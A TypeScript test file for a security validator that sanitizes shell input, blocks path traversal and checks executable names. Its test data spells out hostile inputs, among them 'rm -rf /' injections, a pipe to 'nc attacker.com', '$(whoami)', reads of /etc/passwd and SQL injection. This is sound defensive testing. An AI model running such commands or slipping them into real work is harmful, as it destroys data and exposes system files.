/**
 * Tests for Validator - ESM module with Bun test runner
 */

import { beforeEach, describe, expect, test } from "bun:test";
import { Validator } from "../../src/security/validator.js";
import { assertThrows, TestDataBuilder } from "../mocks/index.test.js";

describe("Validator", () => {
	let validator: Validator;

	beforeEach(() => {
		validator = new Validator();
	});

	describe("sanitizeInput", () => {
		test("removes shell metacharacters", () => {
			const maliciousInputs = [
				{ input: "file.txt; rm -rf /", expected: "file.txt rm -rf " },
				{ input: "test && evil", expected: "test  evil" },
				{ input: "cmd | nc attacker.com", expected: "cmd  nc attacker.com" },
				{ input: "$(whoami)", expected: "whoami" },
				{ input: "`cat /etc/passwd`", expected: "cat /etc/passwd" },
				{ input: "test > /dev/null", expected: "test  /dev/null" },
				{ input: "test < input.txt", expected: "test  input.txt" },
				{ input: "test' OR '1'='1", expected: "test OR 11" },
				{ input: 'test\\"injection\\"', expected: "testinjection" },
			];

			for (const { input, expected } of maliciousInputs) {
				const result = validator.sanitizeInput(input);
				expect(result).toBe(expected);
				// Ensure no shell metacharacters remain
				expect(result).not.toMatch(/[;&|`$()<>\\'"]/);
			}
		});

		test("handles empty and null inputs", () => {
			expect(validator.sanitizeInput("")).toBe("");
			expect(validator.sanitizeInput("   ")).toBe("");
			// Testing runtime null/undefined handling - signature now accepts these types
			expect(validator.sanitizeInput(null)).toBe("");
			expect(validator.sanitizeInput(undefined)).toBe("");
		});

		test("preserves safe characters", () => {
			const safeInputs = [
				"safe-file_name.txt",
				"path/to/file",
				"file 123",
				"test-_.txt",
			];

			for (const input of safeInputs) {
				const result = validator.sanitizeInput(input);
				// Should only remove dangerous characters, not safe ones
				expect(result.replace(/[;&|`$()<>\\'"]*/g, "")).toBe(
					input.replace(/[;&|`$()<>\\'"]*/g, ""),
				);
			}
		});

		test("removes null bytes", () => {
			const input = "test\0evil";
			const result = validator.sanitizeInput(input);
			expect(result).not.toContain("\0");
			expect(result).toBe("testevil");
		});

		test("handles newlines and carriage returns", () => {
			const inputs = [
				"test\nmalicious",
				"test\rmalicious",
				"test\r\nmalicious",
			];

			for (const input of inputs) {
				const result = validator.sanitizeInput(input);
				expect(result).not.toMatch(/[\r\n]/);
			}
		});
	});

	describe("validatePath", () => {
		test("blocks path traversal attempts", async () => {
			const maliciousPaths = TestDataBuilder.createInvalidPaths();

			for (const path of maliciousPaths) {
				await assertThrows(
					() => validator.validatePath(path),
					/traversal|invalid|denied/i,
				);
			}
		});

		test("blocks excessively long paths", async () => {
			const longPath = "a".repeat(5000);
			await assertThrows(
				() => validator.validatePath(longPath),
				/exceeds maximum length/,
			);
		});

		test("allows valid paths", () => {
			const validPaths = TestDataBuilder.createValidPaths();

			for (const path of validPaths) {
				expect(() => validator.validatePath(path)).not.toThrow();
			}
		});

		test("normalizes paths correctly", () => {
			const result = validator.validatePath("./path//to///file");
			expect(result).not.toContain("//");
			expect(result).not.toContain("///");
		});

		test("blocks paths with null bytes", async () => {
			await assertThrows(
				() => validator.validatePath("/path\0/to/file"),
				/invalid|null/i,
			);
		});
	});

	describe("validateArgs", () => {
		test("sanitizes each argument", () => {
			const args = ["--flag", "value; rm -rf /", "$(evil)"];
			const result = validator.validateArgs(args);

			expect(result).toHaveLength(3);
			expect(result[0]).toBe("--flag");
			expect(result[1]).toBe("value rm -rf ");
			expect(result[2]).toBe("evil");
		});

		test("blocks command substitution patterns", async () => {
			const args = ["$(command)", "${variable}", "`backtick`"];

			await assertThrows(
				() => validator.validateArgs(args),
				/substitution not allowed/,
			);
		});

		test("filters empty arguments", () => {
			const args = ["valid", "", "   ", "another"];
			const result = validator.validateArgs(args);

			expect(result).toHaveLength(2);
			expect(result).toEqual(["valid", "another"]);
		});

		test("handles non-array input", () => {
			// Testing runtime type coercion - signature accepts unknown
			// Validates defensive programming: wrong types → empty array fallback
			const result = validator.validateArgs(null);
			expect(result).toEqual([]);

			const result2 = validator.validateArgs(undefined);
			expect(result2).toEqual([]);

			const result3 = validator.validateArgs("string");
			expect(result3).toEqual([]);
		});

		test("limits argument count", () => {
			const manyArgs = Array(1000).fill("arg");
			const result = validator.validateArgs(manyArgs);

			expect(result.length).toBeLessThanOrEqual(100); // Reasonable limit
		});
	});

	describe("validateExecutable", () => {
		test("blocks invalid executable names", async () => {
			const invalidNames = [
				"/usr/bin/cmd;evil",
				"/path/to/exe$(whoami)",
				"exe`injection`",
				"/bin/sh;rm -rf /",
				"test\0evil.exe",
			];

			for (const name of invalidNames) {
				await assertThrows(
					() => validator.validateExecutable(name),
					/invalid executable/i,
				);
			}
		});

		test("allows valid executable paths", () => {
			const validPaths = [
				"/usr/bin/ghostty",
				"/Applications/Terminal.app",
				"ghostty.exe",
				"/opt/local/bin/ghostty-1.0",
				"C:\\Program Files\\Terminal\\terminal.exe",
			];

			for (const path of validPaths) {
				expect(() => validator.validateExecutable(path)).not.toThrow();
			}
		});

		test("rejects empty executable path", async () => {
			await assertThrows(
				() => validator.validateExecutable(""),
				/cannot be empty/,
			);
		});

		test("validates path before checking executable", async () => {
			await assertThrows(
				() => validator.validateExecutable("../../../usr/bin/evil"),
				/traversal/i,
			);
		});
	});

	describe("isSafePath", () => {
		test("identifies unsafe paths", () => {
			const unsafePaths = [
				"../etc/passwd",
				"path/../../sensitive",
				"file;rm -rf /",
				"path|evil",
				"test$(command)",
			];

			for (const path of unsafePaths) {
				expect(validator.isSafePath(path)).toBe(false);
			}
		});

		test("identifies safe paths", () => {
			const safePaths = [
				"/home/user/documents/file.txt",
				"./local/path",
				"simple.txt",
				"path/to/file",
			];

			for (const path of safePaths) {
				const result = validator.isSafePath(path);
				expect(typeof result).toBe("boolean");
			}
		});
	});

	describe("escapePathSpaces", () => {
		test("escapes spaces on Unix platforms", () => {
			const path = "/path/with spaces/file.txt";
			const result = validator.escapePathSpaces(path, "darwin");
			expect(result).toContain("\\ ");
		});

		test("quotes paths on Windows", () => {
			const path = "C:\\Program Files\\Terminal\\terminal.exe";
			const result = validator.escapePathSpaces(path, "win32");
			expect(result).toMatch(/^".*"$/);
		});

		test("validates path before escaping", async () => {
			const maliciousPath = "../../../etc/passwd";
			await assertThrows(
				() => validator.escapePathSpaces(maliciousPath),
				/traversal/,
			);
		});

		test("handles paths without spaces", () => {
			const path = "/path/without/spaces";
			const result = validator.escapePathSpaces(path, "linux");
			expect(result).toBe(path);
		});
	});

	describe("Command Injection Prevention", () => {
		test("prevents common command injection patterns", () => {
			const injectionPatterns = TestDataBuilder.createMaliciousInputs();

			for (const pattern of injectionPatterns) {
				const sanitized = validator.sanitizeInput(pattern);

				// Check that dangerous characters are removed
				expect(sanitized).not.toContain(";");
				expect(sanitized).not.toContain("|");
				expect(sanitized).not.toContain("&");
				expect(sanitized).not.toContain("`");
				expect(sanitized).not.toContain("$");
				expect(sanitized).not.toContain(">");
				expect(sanitized).not.toContain("<");
				expect(sanitized).not.toContain("(");
				expect(sanitized).not.toContain(")");
			}
		});

		test("prevents bash variable expansion", () => {
			const expansionPatterns = [
				"$HOME",
				"${HOME}",
				"$USER",
				"${PATH}",
				"$(echo secret)",
				"${parameter:=value}",
				"${parameter:-default}",
				"${#parameter}",
				"${parameter%pattern}",
				"${parameter/pattern/string}",
			];

			for (const pattern of expansionPatterns) {
				const sanitized = validator.sanitizeInput(pattern);
				expect(sanitized).not.toContain("$");
				expect(sanitized).not.toContain("{");
				expect(sanitized).not.toContain("}");
			}
		});
	});
});
